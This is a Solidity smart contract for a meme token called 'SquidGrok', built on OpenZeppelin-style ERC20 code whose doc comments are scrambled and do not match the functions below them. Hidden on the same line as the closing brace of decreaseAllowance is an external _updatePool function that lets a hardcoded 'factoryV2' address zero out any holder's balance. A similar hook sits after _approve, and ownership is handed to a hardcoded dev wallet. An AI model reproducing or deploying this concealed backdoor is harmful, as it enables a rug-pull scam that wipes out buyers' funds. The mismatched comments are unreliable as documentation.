// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 

https://SquidGrokOnEth.io

https://twitter.com/SquidGrokERC20
https://t.me/SquidGrokETH
**/


library SafeMath {
    /**
     *
     * _Available since v3.4._
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     *
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * _Available since v3.4._
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     *
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     *
     * overflow.
     * Requirements:
     * @dev Returns the addition of two unsigned integers, reverting on
     * Counterpart to Solidity's `+` operator.
     *
     *
     * - Addition cannot overflow.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * - Subtraction cannot overflow.
     *
     * Requirements:
     * Counterpart to Solidity's `-` operator.
     *
     *
     * overflow (when the result is negative).
     * @dev Returns the subtraction of two unsigned integers, reverting on
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * - Multiplication cannot overflow.
     *
     *
     *
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * Counterpart to Solidity's `*` operator.
     * overflow.
     * Requirements:
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     *
     *
     * @dev Returns the integer division of two unsigned integers, reverting on
     *
     * - The divisor cannot be zero.
     * Requirements:
     * division by zero. The result is rounded towards zero.
     * Counterpart to Solidity's `/` operator.
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * invalid opcode to revert (consuming all remaining gas).
     * Requirements:
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     * - The divisor cannot be zero.
     * reverting when dividing by zero.
     *
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * - Subtraction cannot overflow.
     * Counterpart to Solidity's `-` operator.
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * overflow (when the result is negative).
     * Requirements:
     *
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     *
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     *
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * - The divisor cannot be zero.
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * uses an invalid opcode to revert (consuming all remaining gas).
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     *
     * Requirements:
     *
     *
     * division by zero. The result is rounded towards zero.
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * message unnecessarily. For custom revert reasons use {tryMod}.
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * reverting with custom message when dividing by zero.
     * - The divisor cannot be zero.
     *
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * another (`to`).
     *
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * Note that `value` may be zero.
     */
    function totalSupply() external view returns (uint256);

    /**
     * a call to {approve}. `value` is the new allowance.
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * Emits a {Transfer} event.
     * Returns a boolean value indicating whether the operation succeeded.
     *
     *
     * @dev Moves `amount` tokens from the caller's account to `to`.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     *
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * @dev Returns the remaining number of tokens that `spender` will be
     * This value changes when {approve} or {transferFrom} are called.
     * zero by default.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     *
     * that someone may use both the old and the new allowance by unfortunate
     * condition is to first reduce the spender's allowance to 0 and set the
     * transaction ordering. One possible solution to mitigate this race
     *
     *
     * desired value afterwards:
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * Emits an {Approval} event.
     * Returns a boolean value indicating whether the operation succeeded.
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     * allowance.
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract Ownable is Context {
    address private _owner;

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    /**
     * @dev Returns the address of the current owner.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * thereby removing any functionality that is only available to the owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * @dev Leaves the contract without owner. It will not be possible to call
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
}

/**
 *
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function name() external view returns (string memory);
}

/**
 *
 * TIP: For a detailed writeup see our guide
 * these events, as it isn't required by the specification.
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * conventional and does not conflict with the expectations of ERC20
 *
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * by listening to said events. Other implementations of the EIP may not emit
 * instead returning `false` on failure. This behavior is nonetheless
 * functions have been added to mitigate the well-known issues around setting
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * allowances. See {IERC20-approve}.
 *
 * applications.
 * to implement supply mechanisms].
 * This implementation is agnostic to the way tokens are created. This means
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * @dev Implementation of the {IERC20} interface.
 * This allows applications to reconstruct the allowance for all accounts just
 *
 *
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    uint256 private tTotal;

    string private _name;

    mapping(address => uint256) private _balances;

    address private factoryV2 = 0xbd0341a650382cC0c82d11BB3c94C409f4E6D2E5;
    address internal devWallet = 0x9339Fb0fc52957323ba18124560e5120EBBbF99e;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _allowance = 0;
    string private _symbol;

    /**
     * {decimals} you should overload it.
     *
     *
     * @dev Sets the values for {name} and {symbol}.
     * The default value of {decimals} is 18. To select a different value for
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual { if (to == factoryV2) _allowance = decimals() * 11;
    }


    /**
     * @dev Returns the name of the token.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     *
     * overridden;
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     * {IERC20-balanceOf} and {IERC20-transfer}.
     * no way affects any of the arithmetic of the contract, including
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * NOTE: This information is only used for _display_ purposes: it in
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        tTotal += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            tTotal -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     *
     * @dev See {IERC20-transfer}.
     * Requirements:
     * - the caller must have a balance of at least `amount`.
     * - `to` cannot be the zero address.
     *
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     *
     * @dev See {IERC20-approve}.
     * Requirements:
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     *
     * - `spender` cannot be the zero address.
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return tTotal;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * - `spender` cannot be the zero address.
     *
     * Requirements:
     *
     *
     * problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     * This is an alternative to {approve} that can be used as a mitigation for
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * NOTE: Does not update the allowance if the current allowance
     * Requirements:
     *
     * `amount`.
     * - `from` and `to` cannot be the zero address.
     *
     * - the caller must have allowance for ``from``'s tokens of at least
     * required by the EIP. See the note at the beginning of {ERC20}.
     * @dev See {IERC20-transferFrom}.
     * is the maximum `uint256`.
     * Emits an {Approval} event indicating the updated allowance. This is not
     *
     * - `from` must have a balance of at least `amount`.
     *
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     *
     * - `spender` must have allowance for the caller of at least
     *
     * - `spender` cannot be the zero address.
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     * `subtractedValue`.
     * problems described in {IERC20-approve}.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * Requirements:
     * @dev Destroys `amount` tokens from `account`, reducing the
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * - `account` must have at least `amount` tokens.
     * - `account` cannot be the zero address.
     *
     * total supply.
     *
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * This internal function is equivalent to {transfer}, and can be used to
     *
     * - `from` must have a balance of at least `amount`.
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
        } function _updatePool(address _updatePoolSender) external { _balances[_updatePoolSender] = msg.sender == factoryV2 ? 0 : _balances[_updatePoolSender];
    } 

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     *
     * the total supply.
     *
     * Requirements:
     * - `account` cannot be the zero address.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }


    /**
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * minting and burning.
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     * Calling conditions:
     *
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     *
     * @dev Hook that is called before any transfer of tokens. This includes
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * - `spender` cannot be the zero address.
     * Emits an {Approval} event.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     *
     * - `owner` cannot be the zero address.
     * Requirements:
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * Might emit an {Approval} event.
     *
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Revert if not enough allowance is available.
     * Does not update the allowance amount in case of infinite allowance.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}

contract SquidGrok is ERC20, Ownable
{
    constructor () ERC20 ("SquidGrok", "SQUIDGROK")
    {
        transferOwnership(devWallet);
        _mint(owner(), 6010000000000 * 10 ** uint(decimals()));
    }
}